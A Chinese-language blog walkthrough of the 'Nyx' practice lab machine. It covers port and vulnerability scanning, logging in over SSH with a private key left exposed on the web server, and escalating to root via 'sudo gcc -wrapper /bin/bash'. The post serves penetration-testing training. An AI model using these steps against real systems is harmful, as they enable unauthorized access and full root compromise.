+++
title = "Nyx"
date = 2026-06-15T20:25:12+08:00
draft = false
description = "一些打过的靶机"
tags = ["靶机"]
categories = ["靶机"]
series = ["靶机"]
pin = false
cover = "/images/posts/java-security-cover-clean.svg"
+++

# **一.信息搜集**

1.主机探测

发现靶机的地址为 192.168.247.208

![](https://cdn.nlark.com/yuque/0/2025/png/46138799/1744244021552-4863f6be-72ce-4ab6-878f-76c829d0420e.png)

2.端口扫描

nmap -sS -A -p- 192.168.247.208 发现开放了22和80端口

![](https://cdn.nlark.com/yuque/0/2025/png/46138799/1744244028215-528a63e4-c900-4637-a151-25ca0817fa9c.png)

3.漏洞扫描

nikto扫描发现了靶机的一些版本信息，包括一些漏洞

nikto -h 192.168.247.208

![](https://cdn.nlark.com/yuque/0/2025/png/46138799/1744244037441-2bd1e069-4f51-43c4-adf4-9c67b4e4be84.png)

nmap漏洞扫描

nmap --script=vuln -p22,80 192.168.247.208

![](https://cdn.nlark.com/yuque/0/2025/png/46138799/1744244044091-fe3db2b1-fe87-4cc2-85cb-92ed15e030ec.png)

# 二.调试测试

1.web渗透+信息搜集

访问原页面

![](https://cdn.nlark.com/yuque/0/2025/png/46138799/1744244052068-213731a6-c4c6-48de-ac27-d671c1f5c6df.png)

查看网页源代码并无有效信息

访问我们开始利用namp扫描出来的 那个目录：`**/d41d8cd98f00b204e9800998ecf8427e.php**`

发现是个open ssh私钥 我们后面可以尝试用openssh私钥进行免密码登录 ssh

![](https://cdn.nlark.com/yuque/0/2025/png/46138799/1744244062132-ddc39f92-36d6-45cc-8727-86f818c47fd0.png)

2.我们将靶机的openssh私钥,保存到id_rsa文件里 后面利用这个私钥进行免密码登录

我们现在尝试寻找ssh登录的用户，在实际的渗透测试下，如果我们没有找到ssh私钥的用户，我们可以尝试下root用户，但是这个靶场不是root用户

ssh -i id_rsa root@192.168.247.208

![](https://cdn.nlark.com/yuque/0/2025/png/46138799/1744244068806-d9aed076-9235-4434-8210-b73fc37cb40b.png)

![](https://cdn.nlark.com/yuque/0/2025/png/46138799/1744244075650-dc918191-5241-4a22-a6e7-767c72b971a5.png)

返回页面 发现这个用户是mpampis的

私钥文件 “id_rsa” 的权限设置有问题。SSH 客户端要求私钥文件的权限必须是非常严格的，通常是 600 或者 400，表示只有拥有者才可读写。

chmod 600 id_rsa

![](https://cdn.nlark.com/yuque/0/2025/png/46138799/1744244082185-725c1657-2385-4ada-9e86-8515542ead40.png)

利用其进行登录

ssh -i id_rsa mpampis@192.168.247.208 发现登录成功

![](https://cdn.nlark.com/yuque/0/2025/png/46138799/1744244091210-062e4fdd-6855-4a37-b3ce-4bf449472d18.png)

3.user.txt 拿到root的flag

![](https://cdn.nlark.com/yuque/0/2025/png/46138799/1744244098174-926f2d1a-6207-4ad4-928b-e42b5e7c1593.png)

# 三.提权

1.sudo提权

cat /etc/crontab查看是否有定时进程，发现没有定时任务

cat /etc/crontab

![](https://cdn.nlark.com/yuque/0/2025/png/46138799/1744244107264-92980aac-2f78-4386-9d57-273f8f628213.png)

查看哪些具有SUID提权

find / -user root -perm -4000 -print 2>/dev/null

sudo 命令通常用于赋予特定用户或用户组在系统上执行特权操作的权限，而 (root) NOPASSWD 说明了用户 mpampis 可以以 root 权限执行指定的命令而无需输入密码

sudo -l

![](https://cdn.nlark.com/yuque/0/2025/png/46138799/1744244113497-e4529cba-705d-463b-b63e-9079198e78ca.png)

利用gcc提权

sudo gcc -wrapper /bin/bash,-s .

3.root权限 发现成功提权到root权限了

![](https://cdn.nlark.com/yuque/0/2025/png/46138799/1744244117852-5885e396-d826-49e8-af17-5c21a603960f.png)